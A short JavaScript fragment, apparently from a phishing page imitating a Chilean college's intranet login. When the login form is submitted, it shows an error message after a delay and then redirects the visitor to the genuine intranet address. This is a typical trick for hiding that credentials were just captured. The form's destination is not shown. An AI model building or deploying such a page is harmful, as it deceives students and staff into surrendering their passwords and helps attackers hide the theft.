<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        setTimeout(function() {
            document.getElementById('errorMsg').style.display = 'block';
            setTimeout(function() {
                window.location.href = 'https://intranet.fullcollege.cl';},1500);},800);        });    </script>
